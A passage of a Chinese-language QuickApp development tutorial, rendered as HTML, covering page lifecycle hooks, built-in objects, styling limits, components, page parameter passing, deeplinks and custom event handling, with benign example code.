<code>onShow()</code></li><li>在页面A打开页面B：<code>onHide()</code></li><li>从页面B返回页面A：<code>onShow()</code></li><li>A页面返回：<code>onBackPress() -&gt; onHide() -&gt; onDestroy()</code></li></ul><h1 id="四、置顶对象"><a href="#四、置顶对象" class="headerlink" title="四、置顶对象"></a>四、置顶对象</h1><ul><li><code>$app</code> 应用对象</li><li><code>$app.$def</code> 获取在<code>app.ux</code>中暴露的对象</li><li><code>$app.$data</code> 获取在<code>manifest.json</code>的<code>config.data</code>中声明的全局数据</li><li><code>$page</code> 页面对象</li><li><code>$page.action</code> 获取打开当前页面的<code>action</code>。仅在当前页面是通过<code>filter</code>匹配的方式打开时有效，否则为<code>undefined</code>。参见<code>manifest</code></li><li><code>$page.uri</code> 获取打开当前页面的<code>uri</code>。仅在当前页面是通过<code>filter</code>匹配的方式打开时有效，否则为<code>undefined</code></li><li><code>$page.setTitleBar</code> 设置页面标题</li><li><code>$valid</code> 页面对象是否有效</li><li><code>$visible</code> 页面是否处于用户可见状态</li></ul><blockquote><p><code>this.$page.setTitleBar</code> 参数属性包括</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  text: <span class="string">'Hello QuickApp'</span>,        <span class="comment">//标题栏文字</span></span><br><span class="line">  textColor: <span class="string">'#ffff'</span>,            <span class="comment">//文字颜色</span></span><br><span class="line">  backgroundColor: <span class="string">'#434343'</span>,    <span class="comment">//背景颜色</span></span><br><span class="line">  backgroundOpacity: <span class="string">'0.8'</span>,      <span class="comment">//背景透明度</span></span><br><span class="line">  menu: <span class="literal">false</span>,      <span class="comment">//是否在标题栏右上角显示菜单按钮 | 设置当前</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="五、全局对象"><a href="#五、全局对象" class="headerlink" title="五、全局对象"></a>五、全局对象</h1><ul><li><code>$element</code> 获取指定id的组件dom对象，如果没有指定id，则返回根组件<code>dom</code>对象用法：<code>this.$element(&#39;xxx&#39;)</code>获取id为xxx的组件实例对象 <code>this.$element()</code> 获取根组件实例对象</li><li><code>$root</code> 获取顶层<code>ViewModel</code></li><li><code>$parent</code> 获取父亲<code>ViewModel</code></li><li><code>$child</code> 获取指定id的自定义组件的<code>ViewModel</code>用法：<code>this.$child(&#39;xxx&#39;)</code> 获取<code>id</code>为<code>xxx</code>的<code>div</code>组件<code>ViewModel</code></li><li><code>$vm(弃用) 请使用上面</code>this.$child(‘xxx’)`替代</li><li><code>$forceUpdate</code> 强制页面刷新</li><li><code>$set</code> 添加数据属性，必须在<code>onInit</code>函数中使用，用法：<code>this.$set(&#39;key&#39;,value)</code></li><li><code>$delete</code> 删除数据属性，如果在<code>onInit</code>函数中使用，用法：<code>this.$delete(&#39;key&#39;)</code></li></ul><h1 id="六、元素属性方法"><a href="#六、元素属性方法" class="headerlink" title="六、元素属性方法"></a>六、元素属性方法</h1><blockquote><p>注意，获取元素应该在页面已渲染后，如 onReady 事件中或 onReady 事件执行完以后</p></blockquote><ul><li><code>$set</code> 添加数据属性，用法：<code>this.$vm(&#39;id&#39;).$set(&#39;key&#39;,value)</code></li><li><code>$delete</code>删除数据属性，用法：<code>this.$vm(&#39;id&#39;).$delete(&#39;key&#39;)</code></li><li><code>$on</code> 在当前页面注册监听事件， 可监听<code>$emit()</code>、 <code>$dispatch()</code>、 <code>$broadcast()</code>等触发的自定义事件，不能用于注册组件节点的事件响应</li><li><code>$off</code> 移除事件监听，参数 <code>fnHandler</code> 为可选，传递仅移除指定的响应函数，不传递则移除此事件的所有监听</li><li><code>$emit</code> 触发当前实例监听事件函数，与 <code>$on()</code> 配合使用</li></ul><h1 id="七、页面设计"><a href="#七、页面设计" class="headerlink" title="七、页面设计"></a>七、页面设计</h1><p><strong>布局和尺寸</strong></p><ul><li>采用<code>border-box</code> 模型且不支持 <code>box-sizing</code> 属性</li><li>目前仅支持长度单位<code>px</code>和<code>%</code></li><li>设计稿1px / 设计稿基准宽度 = 框架样式1px / 项目配置基准宽度(项目配置基准宽度:<code>/src/manifest.json</code> 中 <code>config.designWidth</code> 的值，默认<code>750</code>)</li></ul><p><strong>CSS</strong></p><ul><li>可以使用内联样式、<code>tag</code>选择器、<code>class</code>选择器、id选择器来为组件设置样式</li><li>仅可以使用并列选择、后代选择器、子代选择器</li><li>支持<code>@import</code>引入外部样式、内联样式、行内样式</li><li>颜色值不支持缩写，伪类支持不完全（支持<code>:disabled</code>,<code>:checked</code>,<code>:focus</code>等)</li></ul><h1 id="八、组件"><a href="#八、组件" class="headerlink" title="八、组件"></a>八、组件</h1><blockquote><p><code>&lt;text&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;span&gt;</code>、<code>&lt;label&gt;</code>组件为文本容器组件，其它组件不能直接放置文本内容</p></blockquote><p><strong><code>&lt;div&gt;</code>: 和 HTML 一样</strong></p><blockquote><p>支持样式 flex-direction, flex-wrap, justify-content, align-items, align-content</p></blockquote><p><strong><code>&lt;popup&gt;</code>: 气泡框</strong></p><ul><li>支持属性 <code>target</code> 和 <code>placement</code></li><li>支持样式 <code>mask-color</code></li><li>支持事件 <code>visibilitychange</code></li><li>自组件只能是<code>&lt;text&gt;</code></li></ul><p><strong><code>&lt;refresh&gt;</code>: 下拉刷新</strong></p><ul><li>支持属性 <code>offset</code>和 <code>refreshing</code></li><li>支持样式 <code>background-color</code> 和 <code>progress-color</code></li><li>支持事件 <code>refresh</code></li></ul><p><strong><code>&lt;richtext&gt;</code>: 富文本编辑器</strong></p><ul><li>支持属性 <code>type(值为 html)</code></li><li>支持<code>div</code>样式, <code>height</code> 无效</li><li>不支持子组件</li></ul><blockquote><p>更多详情 <a href="https://doc.quickapp.cn/widgets/div.html" target="_blank" rel="noopener">https://doc.quickapp.cn/widgets/div.html</a></p></blockquote><h1 id="九、页面切换和参数传递"><a href="#九、页面切换和参数传递" class="headerlink" title="九、页面切换和参数传递"></a>九、页面切换和参数传递</h1><h2 id="9-1-参数传递"><a href="#9-1-参数传递" class="headerlink" title="9.1 参数传递"></a>9.1 参数传递</h2><p><strong>传递方法1</strong></p><blockquote><p><code>&lt;a&gt;</code>标签配合 <code>queryString</code> 传递参数, 这个和前端一致</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/src/home/index.html?key=2333"</span>&gt;</span>跳转页面<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 添加变量参数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/PageParams/receiveparams?key=&#123;&#123;title&#125;&#125;"</span>&gt;</span>携带参数key2跳转<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>传递方法2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 导入模块</span><br><span class="line">import router from &apos;@system.router&apos;</span><br></pre></td></tr></table></figure><blockquote><p>通过 <code>router</code> 接口：<code>router.push()</code>, <code>router.replace()</code>, 接受一个如下结构的对象，用法这个和前端 <code>router</code> 一致。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  url: <span class="string">'/src/home/index.html'</span>,</span><br><span class="line">  params: &#123; <span class="attr">key</span>: <span class="number">2333</span> <span class="comment">/* 需要传递的参数 */</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>接收参数</strong></p><blockquote><p>上述2种传递参数的方法，其接收方法一致，在接收参数页面的 <code>protected</code>对象中获取即可（可设置默认值）</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">   protected: &#123;</span><br><span class="line">     key: <span class="string">''</span></span><br><span class="line">   &#125;,</span><br><span class="line">   onInit () &#123;</span><br><span class="line">     <span class="keyword">this</span>.$page.setTitleBar(&#123; <span class="attr">text</span>: <span class="string">'接收参数'</span> &#125;)</span><br><span class="line"></span><br><span class="line">     <span class="comment">// js中输出页面传递的参数</span></span><br><span class="line">     <span class="built_in">console</span>.info(<span class="string">'key: '</span> + <span class="keyword">this</span>.key)</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>回传参数</strong></p><blockquote><p>开发者可能会遇到需要在页面之间回传参数的需求</p></blockquote><ul><li>假设存在页面A和页面B，先从页面A跳转至页面B，然后从页面B返回到页面A时，需要传递参数<br>= 此时，组件a和接口router传参不能满足需求，可以借助于app级别的对象：this.$app.$data</li></ul><blockquote><p>页面A实现代码如下</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tutorial-page"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/PageParams/returnParams/pageb"</span>&gt;</span>跳转到页面B<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.tutorial-page</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex-direction: column;</span></span><br><span class="line"><span class="undefined">    justify-content: center;</span></span><br><span class="line"><span class="undefined">    align-items: center;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">  a &#123;</span></span><br><span class="line"><span class="undefined">    margin-top: 75px;</span></span><br><span class="line"><span class="undefined">    font-size: 30px;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">color</span>: <span class="selector-id">#09ba07</span>;</span></span><br><span class="line"><span class="undefined">    text-decoration: underline;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">    private: &#123;</span></span><br><span class="line"><span class="javascript">      msg: <span class="string">''</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onInit () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.$page.setTitleBar(&#123; <span class="attr">text</span>: <span class="string">'页面A'</span> &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onShow () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 页面被切换显示时，从数据中检查是否有页面B传递来的数据</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (<span class="keyword">this</span>.$app.$data.dataPageB &amp;&amp; <span class="keyword">this</span>.$app.$data.dataPageB.gotoPage === <span class="string">'pageA'</span>) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 从数据中获取回传给本页面的数据</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> data = <span class="keyword">this</span>.$app.$data.dataPageB.params</span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.msg = data.msg</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面B实现代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tutorial-page"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>页面B<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">"width: 450px;"</span> <span class="attr">placeholder</span>=<span class="string">"请输入回传给页面A的信息"</span> <span class="attr">onchange</span>=<span class="string">"updateMsg"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.tutorial-page</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex-direction: column;</span></span><br><span class="line"><span class="undefined">    justify-content: center;</span></span><br><span class="line"><span class="undefined">    align-items: center;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">    private: &#123;</span></span><br><span class="line"><span class="javascript">      msg: <span class="string">''</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onInit () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.$page.setTitleBar(&#123; <span class="attr">text</span>: <span class="string">'页面B'</span> &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onHide () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 页面被切换隐藏时，将要传递的数据对象写入</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.$app.$data.dataPageB = &#123;</span></span><br><span class="line"><span class="javascript">        gotoPage: <span class="string">'pageA'</span>,</span></span><br><span class="line"><span class="undefined">        params: &#123;</span></span><br><span class="line"><span class="javascript">          msg: <span class="keyword">this</span>.msg</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    updateMsg (e) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 更新input输入的信息文本</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.msg = e.text</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-2-页面间通信"><a href="#9-2-页面间通信" class="headerlink" title="9.2 页面间通信"></a>9.2 页面间通信</h2><blockquote><p><a href="https://doc.quickapp.cn/framework/script.html" target="_blank" rel="noopener">https://doc.quickapp.cn/framework/script.html</a></p></blockquote><blockquote><p>会利用到一个构造函数 <code>new BroadcastChannel(string)</code>, 它接受一个字符串参数，作为实例的频道名称。它的实例具有以下属性和方法</p></blockquote><ul><li><code>name</code> 频道名称,区分不同的消息频道(注意：不同频道之间不可通信)。</li><li><code>postMessage</code> 用于在当前频道中广播消息</li><li><code>onmessage</code> 订阅消息。在频道中接收到广播消息之后，会给所有订阅者派发消息事件</li><li><code>close</code> 关闭当前的频道</li></ul><blockquote><p>其中 <code>onmessage</code> 事件有2个属性(通过 <code>event</code> 对象访问)</p></blockquote><ul><li><code>type</code> message</li><li><code>data</code> 接收到的消息内容</li></ul><h1 id="十、组件通信"><a href="#十、组件通信" class="headerlink" title="十、组件通信"></a>十、组件通信</h1><p><strong>父组件到子组件</strong></p><ul><li>子组件通过 <code>props</code> 获取父组件传入的值，见上文 template 部分</li><li>通过 <code>this.watch(props, callback)</code> 监控传入数据变化并调用回调函数</li><li>父组件通过<code>this.$broadcast()</code>完成事件触发，子组件通过<code>$on()</code>绑定事件并响应</li></ul><p><strong>子组件到父组件</strong></p><ul><li>父子组件传对象类型属于引用传递，可以直接修改父组件传入对象改变父组件数据</li><li>子组件通过<code>this.$dispatch()</code>完成事件触发，父组件通过<code>$on()</code>绑定事件并响应</li><li>子组件通过<code>this.$emit()</code>触发在节点上绑定的事件来执行父组件的方法</li></ul><blockquote><ul><li>注：<code>this.$broadcast()</code>、<code>this.$emit()</code> 和 <code>this.$dispatch()</code>参数一致</li><li>注：触发时传递参数，再接收时使用<code>event.detail</code>来获取参数</li><li>注：当传递结束后，可以调用<code>event.stop()</code>来结束传递</li></ul></blockquote><h1 id="十一、Deeplink"><a href="#十一、Deeplink" class="headerlink" title="十一、Deeplink"></a>十一、Deeplink</h1><blockquote><p>配合<code>&lt;web&gt;</code>标签框架支持通过链接从外部打开应用，格式</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//hapjs.org/app/&lt;package&gt;/[path][?key=value]</span></span><br><span class="line">https:<span class="comment">//hapjs.org/app/&lt;package&gt;/[path][?key=value]</span></span><br><span class="line">hap:<span class="comment">//app/&lt;package&gt;/[path][?key=value]</span></span><br></pre></td></tr></table></figure><ul><li><code>package</code>: 应用包名，必选</li><li><code>path</code>: 应用内页面的<code>path</code>，可选，默认为首页</li><li><code>key-value</code>: 希望传给页面的参数，可选，可以有多个</li></ul><blockquote><p>从传统网页调起需引入以下脚本</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&apos;//statres.quickapp.cn/quickapp/js/routerinline.min.js&apos;/&gt;</span><br></pre></td></tr></table></figure><h1 id="十二、事件监听与触发"><a href="#十二、事件监听与触发" class="headerlink" title="十二、事件监听与触发"></a>十二、事件监听与触发</h1><blockquote><p><code>$on</code> 用于监听自定义事件；<code>$off</code>移除对应的事件监听</p></blockquote><p><strong>$on(evtName, fnHandler)</strong></p><blockquote><p>在当前页面注册监听事件， 可监听<code>$emit()</code>、 <code>$dispatch()</code>、 <code>$broadcast()</code>等触发的自定义事件，不能用于注册组件节点的事件响应</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    onInit()&#123;</span><br><span class="line">      <span class="keyword">this</span>.$on(<span class="string">'customEvtType1'</span>, <span class="keyword">this</span>.customEvtType1Handler)</span><br><span class="line">    &#125;,</span><br><span class="line">    customEvtType1Handler(evt)&#123;</span><br><span class="line">      <span class="comment">// 事件类型，事件参数</span></span><br><span class="line">      <span class="built_in">console</span>.info(<span class="string">`触发事件：类型：<span class="subst">$&#123;evt.type&#125;</span>, 参数： <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(evt.detail)&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>$off(evtName, fnHandler)</strong></p><blockquote><p>移除事件监听，参数 fnHandler 为可选，传递仅移除指定的响应函数，不传递则移除此事件的所有监听</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    removeEventHandler () &#123;</span><br><span class="line">      <span class="comment">// 不传递fnHandler：移除所有监听</span></span><br><span class="line">      <span class="keyword">this</span>.$off(<span class="string">'customEvtType1'</span>)</span><br><span class="line">      <span class="comment">// 传递fnHandler：移除指定的监听函数</span></span><br><span class="line">      <span class="keyword">this</span>.$off(<span class="string">'customEvtType1'</span>, <span class="keyword">this</span>.customEvtType1Handler)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>触发ViewModel事件</strong></p><blockquote><p>页面的交互中可能会遇到一些非手动触发的需求，$emit() 通过触发当前实例上的事件达到动态触发事件的行为</p></blockquote><p><strong>$emit(evtName, evtDetail)</strong></p><ul><li>触发当前实例监听事件函数，与 <code>$on()</code> 配合使用</li><li>注意：<code>$emit()</code> 目前只触发 <code>$on</code> 所监听的事件</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    emitEvent () &#123;</span><br><span class="line">      <span class="keyword">this</span>.$emit(<span class="string">'customEvtType1'</span>, &#123; <span class="attr">params</span>: <span class="string">'参数内容'</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>监听原生组件事件</strong></p><ul><li>原生组件支持一系列事件，如通用事件（如：click, disappear）、组件专有事件（如：focus）</li></ul><blockquote><ul><li>在响应函数执行时通过target获取，如：onClickHandler</li><li>在响应函数绑定时传递参数，如：onClickHandler2</li></ul></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tutorial-page"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">id</span>=<span class="string">"elNode1"</span> <span class="attr">class</span>=<span class="string">"&#123;&#123; elClassName + 1 &#125;&#125;"</span> <span class="attr">disabled</span>=<span class="string">"false"</span> <span class="attr">onclick</span>=<span class="string">"onClickHandler"</span>&gt;</span>组件节点1<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">id</span>=<span class="string">"elNode2"</span> <span class="attr">class</span>=<span class="string">"class-static-1 &#123;&#123; elClassName + 2 &#125;&#125;"</span> <span class="attr">onclick</span>=<span class="string">"onClickHandler2('参数1', argName)"</span>&gt;</span>组件节点2<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"less"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.tutorial-page</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex-direction: column;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">    private: &#123;</span></span><br><span class="line"><span class="javascript">      elClassName: <span class="string">'class-dynamic'</span>,</span></span><br><span class="line"><span class="javascript">      argName: <span class="string">'动态参数'</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onClickHandler (evt) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 事件类型，参数详情</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.info(<span class="string">`触发事件：类型：<span class="subst">$&#123;evt.type&#125;</span>, 详情： <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(evt.detail)&#125;</span>`</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (evt.target) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.info(<span class="string">`触发事件：节点：<span class="subst">$&#123;evt.target.id&#125;</span>, <span class="subst">$&#123;evt.target.attr.disabled&#125;</span>`</span>)</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onClickHandler2 (arg1, arg2, evt) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 事件类型，事件参数，target</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.info(<span class="string">`触发事件：类型：<span class="subst">$&#123;evt.type&#125;</span>, 参数： <span class="subst">$&#123;arg1&#125;</span>, <span class="subst">$&#123;arg2&#125;</span>`</span>);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>触发原生组件事件</strong></p><blockquote><p>通过<code>$emitElement()</code>完成事件的动态触发</p></blockquote><ul><li><strong>$emitElement(evtName, evtDetail, id)</strong></li></ul><blockquote><p>可以触发指定组件<code>id</code>的事件，通过<code>evt.detail</code>获取传递的参数；该方法对自定义组件无效</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 